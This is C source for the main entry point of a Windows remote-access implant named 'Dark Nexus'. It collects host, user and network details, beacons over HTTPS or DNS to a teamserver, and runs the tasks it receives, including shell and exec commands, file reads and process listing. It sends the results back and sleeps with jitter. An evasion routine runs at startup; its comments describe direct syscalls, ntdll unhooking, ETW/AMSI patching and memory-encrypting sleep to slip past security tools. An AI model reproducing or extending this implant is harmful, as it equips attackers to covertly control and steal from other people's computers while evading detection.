#include "config.h"
#include "util/types.h"
#include "crypto/aes.h"
#include "comms/https.h"
#include "comms/dns.h"
#include "commands/cmd_exec.h"
#include "evasion/evasion.h"

#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")

/*
 * Dark Nexus Implant — Main Entry Point
 *
 * Lifecycle:
 *   1. Collect system metadata (hostname, user, IP, OS, etc.)
 *   2. Generate unique implant ID
 *   3. Initialize HTTPS comms channel
 *   4. Enter beacon loop:
 *      a. Check kill date
 *      b. Check-in with teamserver (receive tasks)
 *      c. Execute tasks via command dispatch
 *      d. Send results back
 *      e. Sleep with jitter
 *   5. Cleanup on exit
 */

// ============================================================
// Channel Abstraction
// ============================================================

// Function pointers for the active comms channel
typedef BOOL (*fn_channel_init)(void);
typedef BOOL (*fn_channel_checkin)(DN_METADATA*, DN_CHECKIN_RESPONSE*);
typedef BOOL (*fn_channel_send_results)(DN_TASK_RESULT*, int);
typedef void (*fn_channel_cleanup)(void);

static fn_channel_init          g_chan_init;
static fn_channel_checkin       g_chan_checkin;
static fn_channel_send_results  g_chan_send_results;
static fn_channel_cleanup       g_chan_cleanup;

static void select_channel(void) {
#if defined(DN_CHANNEL_DNS)
    g_chan_init         = dn_dns_init;
    g_chan_checkin      = dn_dns_checkin;
    g_chan_send_results = dn_dns_send_results;
    g_chan_cleanup      = dn_dns_cleanup;
#else
    // default: HTTPS
    g_chan_init         = dn_https_init;
    g_chan_checkin      = dn_https_checkin;
    g_chan_send_results = dn_https_send_results;
    g_chan_cleanup      = dn_https_cleanup;
#endif
}

// ============================================================
// Globals
// ============================================================

static DN_METADATA g_meta;
static int g_sleep_seconds = DN_SLEEP_SECONDS;
static int g_jitter_percent = DN_JITTER_PERCENT;
static volatile BOOL g_running = TRUE;

// Command dispatch table
static DN_COMMAND g_commands[] = {
    { "shell",    dn_cmd_shell    },
    { "exec",     dn_cmd_exec     },
    { "pwd",      dn_cmd_pwd      },
    { "cd",       dn_cmd_cd       },
    { "whoami",   dn_cmd_whoami   },
    { "hostname", dn_cmd_hostname },
    { "ps",       dn_cmd_ps       },
    { "ls",       dn_cmd_ls       },
    { "cat",      dn_cmd_cat      },
    { "sleep",    dn_cmd_sleep    },
    { "",         NULL            }  // sentinel
};

// ============================================================
// System Information Collection
// ============================================================

static void generate_implant_id(char* id_buf, int buf_size) {
    // simple UUID-like ID from random bytes
    srand((unsigned int)(GetTickCount64() ^ GetCurrentProcessId()));

    unsigned char bytes[16];
    for (int i = 0; i < 16; i++) {
        bytes[i] = (unsigned char)(rand() & 0xFF);
    }

    // format as hex string
    snprintf(id_buf, buf_size,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        bytes[0], bytes[1], bytes[2], bytes[3],
        bytes[4], bytes[5],
        bytes[6], bytes[7],
        bytes[8], bytes[9],
        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]
    );
}

static void collect_hostname(void) {
    DWORD size = sizeof(g_meta.hostname);
    if (!GetComputerNameA(g_meta.hostname, &size)) {
        strncpy(g_meta.hostname, "unknown", sizeof(g_meta.hostname) - 1);
    }
}

static void collect_username(void) {
    DWORD size = sizeof(g_meta.username);
    if (!GetUserNameA(g_meta.username, &size)) {
        strncpy(g_meta.username, "unknown", sizeof(g_meta.username) - 1);
    }
}

static void collect_domain(void) {
    DWORD size = GetEnvironmentVariableA("USERDOMAIN", g_meta.domain, sizeof(g_meta.domain));
    if (size == 0) {
        strncpy(g_meta.domain, "WORKGROUP", sizeof(g_meta.domain) - 1);
    }
}

static void collect_internal_ip(void) {
    // use GetAdaptersInfo to find first non-loopback IPv4
    ULONG buf_len = sizeof(IP_ADAPTER_INFO) * 16;
    IP_ADAPTER_INFO* adapters = (IP_ADAPTER_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_len);
    if (!adapters) {
        strncpy(g_meta.internal_ip, "0.0.0.0", sizeof(g_meta.internal_ip) - 1);
        return;
    }

    if (GetAdaptersInfo(adapters, &buf_len) == ERROR_SUCCESS) {
        IP_ADAPTER_INFO* adapter = adapters;
        while (adapter) {
            const char* ip = adapter->IpAddressList.IpAddress.String;
            if (ip && strcmp(ip, "0.0.0.0") != 0 && strcmp(ip, "127.0.0.1") != 0) {
                strncpy(g_meta.internal_ip, ip, sizeof(g_meta.internal_ip) - 1);
                break;
            }
            adapter = adapter->Next;
        }
    }

    if (g_meta.internal_ip[0] == '\0') {
        strncpy(g_meta.internal_ip, "0.0.0.0", sizeof(g_meta.internal_ip) - 1);
    }

    HeapFree(GetProcessHeap(), 0, adapters);
}

static void collect_os_info(void) {
    // use RtlGetVersion for accurate version (GetVersionEx lies post-8.1)
    typedef NTSTATUS (WINAPI *RtlGetVersionFunc)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    if (hNtdll) {
        RtlGetVersionFunc pRtlGetVersion = (RtlGetVersionFunc)GetProcAddress(hNtdll, "RtlGetVersion");
        if (pRtlGetVersion) {
            RTL_OSVERSIONINFOW osvi;
            osvi.dwOSVersionInfoSize = sizeof(osvi);
            if (pRtlGetVersion(&osvi) == 0) {
                snprintf(g_meta.os, sizeof(g_meta.os), "Windows %lu.%lu.%lu",
                         osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
                return;
            }
        }
    }

    strncpy(g_meta.os, "Windows", sizeof(g_meta.os) - 1);
}

static void collect_arch(void) {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);

    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            strncpy(g_meta.arch, "x64", sizeof(g_meta.arch) - 1);
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            strncpy(g_meta.arch, "x86", sizeof(g_meta.arch) - 1);
            break;
        case PROCESSOR_ARCHITECTURE_ARM64:
            strncpy(g_meta.arch, "arm64", sizeof(g_meta.arch) - 1);
            break;
        default:
            strncpy(g_meta.arch, "unknown", sizeof(g_meta.arch) - 1);
    }
}

static void collect_process_info(void) {
    g_meta.pid = GetCurrentProcessId();

    // get own process name from module filename
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH)) {
        // extract just the filename
        const char* name = strrchr(path, '\\');
        if (name) name++;
        else name = path;
        strncpy(g_meta.process_name, name, sizeof(g_meta.process_name) - 1);
    } else {
        strncpy(g_meta.process_name, "unknown.exe", sizeof(g_meta.process_name) - 1);
    }
}

static void collect_metadata(void) {
    ZeroMemory(&g_meta, sizeof(g_meta));

    generate_implant_id(g_meta.id, sizeof(g_meta.id));
    collect_hostname();
    collect_username();
    collect_domain();
    collect_internal_ip();
    collect_os_info();
    collect_arch();
    collect_process_info();

    g_meta.sleep = g_sleep_seconds;
    g_meta.jitter = g_jitter_percent;
}

// ============================================================
// Kill Date Check
// ============================================================

static BOOL check_kill_date(void) {
#if DN_KILL_DATE > 0
    SYSTEMTIME st;
    GetLocalTime(&st);
    int today = st.wYear * 10000 + st.wMonth * 100 + st.wDay;
    return today <= DN_KILL_DATE;
#else
    return TRUE; // no kill date set
#endif
}

// ============================================================
// Task Dispatch
// ============================================================

// forward declaration
static void set_result_output(DN_TASK_RESULT* result, const char* str);

static DN_CMD_HANDLER find_handler(const char* command) {
    for (int i = 0; g_commands[i].handler != NULL; i++) {
        if (_stricmp(g_commands[i].name, command) == 0) {
            return g_commands[i].handler;
        }
    }
    return NULL;
}

static void dispatch_tasks(DN_TASK* tasks, int count, DN_TASK_RESULT* results) {
    for (int i = 0; i < count; i++) {
        ZeroMemory(&results[i], sizeof(DN_TASK_RESULT));
        strncpy(results[i].task_id, tasks[i].id, sizeof(results[i].task_id) - 1);

        // handle built-in exit command
        if (_stricmp(tasks[i].command, "exit") == 0) {
            strncpy(results[i].status, "completed", sizeof(results[i].status) - 1);
            set_result_output(&results[i], "exiting");
            g_running = FALSE;
            continue;
        }

        DN_CMD_HANDLER handler = find_handler(tasks[i].command);
        if (handler) {
            handler(&tasks[i], &results[i]);

            // handle sleep command side-effect: apply new interval
            if (_stricmp(tasks[i].command, "sleep") == 0 && results[i].output) {
                int new_sleep = 0, new_jitter = -1;
                sscanf(results[i].output, "sleep=%d jitter=%d", &new_sleep, &new_jitter);
                if (new_sleep > 0) g_sleep_seconds = new_sleep;
                if (new_jitter >= 0) g_jitter_percent = new_jitter;
                g_meta.sleep = g_sleep_seconds;
                g_meta.jitter = g_jitter_percent;
            }
        } else {
            strncpy(results[i].status, "failed", sizeof(results[i].status) - 1);
            char err[128];
            snprintf(err, sizeof(err), "unknown command: %s", tasks[i].command);
            DWORD len = (DWORD)strlen(err);
            results[i].output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
            if (results[i].output) {
                memcpy(results[i].output, err, len);
                results[i].output_len = len;
            }
        }
    }
}

// helper to set output on a result
static void set_result_output(DN_TASK_RESULT* result, const char* str) {
    DWORD len = (DWORD)strlen(str);
    result->output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
    if (result->output) {
        memcpy(result->output, str, len);
        result->output_len = len;
    }
}

// ============================================================
// Sleep with Jitter
// ============================================================

static void jittered_sleep(void) {
    int base_ms = g_sleep_seconds * 1000;

    if (g_jitter_percent > 0) {
        int jitter_range = (base_ms * g_jitter_percent) / 100;
        int jitter = (rand() % (jitter_range * 2 + 1)) - jitter_range;
        base_ms += jitter;
        if (base_ms < 100) base_ms = 100; // minimum 100ms
    }

    // use obfuscated sleep: encrypts .text section during sleep
    // to defeat memory signature scanners
    dn_sleep_obfuscated((DWORD)base_ms);
}

// ============================================================
// Cleanup
// ============================================================

static void free_checkin_response(DN_CHECKIN_RESPONSE* resp) {
    if (resp->tasks) {
        for (int i = 0; i < resp->task_count; i++) {
            if (resp->tasks[i].args) {
                HeapFree(GetProcessHeap(), 0, resp->tasks[i].args);
            }
        }
        HeapFree(GetProcessHeap(), 0, resp->tasks);
        resp->tasks = NULL;
        resp->task_count = 0;
    }
}

static void free_results(DN_TASK_RESULT* results, int count) {
    for (int i = 0; i < count; i++) {
        if (results[i].output) {
            HeapFree(GetProcessHeap(), 0, results[i].output);
        }
    }
}

// ============================================================
// Main Entry Point
// ============================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;

    // seed RNG
    srand((unsigned int)(GetTickCount64() ^ GetCurrentProcessId() ^ GetCurrentThreadId()));

    // ============================
    // Evasion Stack Bootstrap
    // ============================
    // Must run before anything operational:
    //   1. Syscall engine (Hell's Gate SSN extraction)
    //   2. ntdll unhooking (restore clean .text)
    //   3. ETW/AMSI patching (silence telemetry)
    //   4. Sleep obfuscation init (capture image base)
    DN_EVASION_STATUS evasion = dn_evasion_init();
    (void)evasion; // status available for future telemetry

    // collect system metadata
    collect_metadata();

    // select and initialize comms channel
    select_channel();
    if (!g_chan_init()) {
        return 1;
    }

    int consecutive_failures = 0;

    // ============================
    // Main Beacon Loop
    // ============================
    while (g_running) {

        // kill date check
        if (!check_kill_date()) {
            break;
        }

        // check-in with teamserver
        DN_CHECKIN_RESPONSE response;
        ZeroMemory(&response, sizeof(response));

        BOOL checkin_ok = g_chan_checkin(&g_meta, &response);

        if (checkin_ok) {
            consecutive_failures = 0;

            // dispatch received tasks
            if (response.task_count > 0) {
                DN_TASK_RESULT* results = (DN_TASK_RESULT*)HeapAlloc(
                    GetProcessHeap(), HEAP_ZERO_MEMORY,
                    sizeof(DN_TASK_RESULT) * response.task_count
                );

                if (results) {
                    dispatch_tasks(response.tasks, response.task_count, results);

                    // send results back
                    g_chan_send_results(results, response.task_count);

                    // cleanup results
                    free_results(results, response.task_count);
                    HeapFree(GetProcessHeap(), 0, results);
                }
            }

            // cleanup response
            free_checkin_response(&response);
        } else {
            consecutive_failures++;
            if (consecutive_failures >= DN_MAX_RETRIES) {
                break; // too many failures, bail
            }
        }

        // sleep with jitter
        if (g_running) {
            jittered_sleep();
        }
    }

    // cleanup
    g_chan_cleanup();

    return 0;
}
